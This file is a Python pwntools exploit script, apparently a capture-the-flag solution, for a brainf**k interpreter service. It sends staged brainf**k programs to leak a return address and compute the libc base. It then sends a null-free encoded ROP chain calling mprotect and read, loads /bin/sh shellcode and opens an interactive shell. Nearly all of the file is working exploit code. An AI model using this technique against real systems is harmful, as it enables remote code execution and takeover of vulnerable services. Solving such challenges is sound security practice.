import argparse

from pwn import *

parser = argparse.ArgumentParser()
parser.add_argument("address", default="127.0.0.1:8000", help="Address of challenge")

OFFSET_LIBC_LEAK = 0x29d90
OFFSET_LIBC_DATA = 0x3a000

OFFSET_MPROTECT  = 0x11ec50 #  int mprotect(void *addr, size_t len, int prot);
OFFSET_READ      = 0x114980 #  ssize_t read(int fd, void *buf, size_t count);
GADGET_POP_RDI   = 0x1b8ade #: pop rdi ; ret  ;  \x5f\xc3 (1 found)
GADGET_POP_RSI   = 0x173cf0 #: pop rsi ; ret  ;  \x5e\xc3 (1 found)
GADGET_POP_RDX   = 0x174fde #: pop rdx ; pop rbx ; ret  ;  \x5a\x5b\xc3 (1 found)
GADGET_RET_8     = 0x1bb908 #: ret  ;  \xc3 (1 found)


LOCAL = True

args = parser.parse_args()

HOST, PORT = args.address.split(':')

context(arch='amd64', os='linux')

r = remote(HOST, int(PORT), level='debug')
#r = process('./challenge/build/challenge', level='debug')
#r = gdb.debug('./challenge/build/challenge', level='debug')

#if LOCAL:
#    libc = r.libc
#else:
#    libc = ELF('./handout/libc.so')

r.recvuntil(b'Please input your brainf**k program: ')

# Stage 1 brainfuck program
r.sendline(b'>,[>,][')

r.recvline_contains(b'Program: ')

# Stage 2 brainfuck program
payload = ''
payload += ']'      # jump target
payload += ',[>,]'  # forward DP until null
payload += '>'*8    # skip stack cookie
payload += '.>'*8   # print rbp
payload += '.>'*8   # print return address

payload += '<'*8     # go back over return address
payload += ',>,[>,]' # forward DP until null
payload += '<[--<]'  # decrease each byte with 2 and rewind

payload += '<'*16   # reqind over stack cookie and rbp
payload += '<[<]'   # rewind, DP=0
payload += '<[<]'   # rewind, DP=-1
payload += '<[<]'   # rewind, DP=-2
payload += '<[<]'   # rewind, DP=-X

payload += ',>'*9   # overwrite start
payload += ',],]'   # jump back to start

r.sendline(payload.encode() + b'\0')

# Stage 3 payload
payload2 = b''
payload2 += b'A'*12 # forward DP
payload2 += b'\0'   # stop

r.sendline(payload2)

leak = r.recv(16)
rax = u64(leak[:8])
ret_addr = u64(leak[8:])
libc_base = ret_addr - OFFSET_LIBC_LEAK
log.info('RAX: %x', rax)
log.info('Return address: %x', ret_addr)
log.info('Libc base: %x', libc_base)


shellcode_addr = libc_base + OFFSET_LIBC_DATA
rop_chain = [
    libc_base + GADGET_RET_8,

    libc_base + GADGET_POP_RDI,
    shellcode_addr, # addr
    libc_base + GADGET_POP_RSI,
    0x1000,          # len
    libc_base + GADGET_POP_RDX,
    0x7,    # prot
    0x0,    # dummy
    libc_base + OFFSET_MPROTECT,

    libc_base + GADGET_POP_RDI,
    0x0,            # fd
    libc_base + GADGET_POP_RSI,
    shellcode_addr, # buf
    libc_base + GADGET_POP_RDX,
    0x100,          # count
    0x0,            # dummy
    libc_base + OFFSET_READ,

    shellcode_addr
]
rop_chain = b''.join(p64(x) for x in rop_chain)
rop_chain = bytes((x+2)&0xFF for x in rop_chain)
rop_chain = rop_chain[1:]
#rop_chain = b'D'*512

assert b'\x00' not in rop_chain
payload3 = b''
payload3 += rop_chain
payload3 += b'\0'

payload3 += b'B'*9                  # clear beginning
payload3 += b'\0'                   # don't jump back
payload3 += b'C'                    # jump back

r.send(payload3) 

payload4 = asm(shellcraft.sh())
payload4 = payload4.ljust(0x100, b'\xff')
#payload4 = b'A'*0x100

r.send(payload4) 

r.interactive()
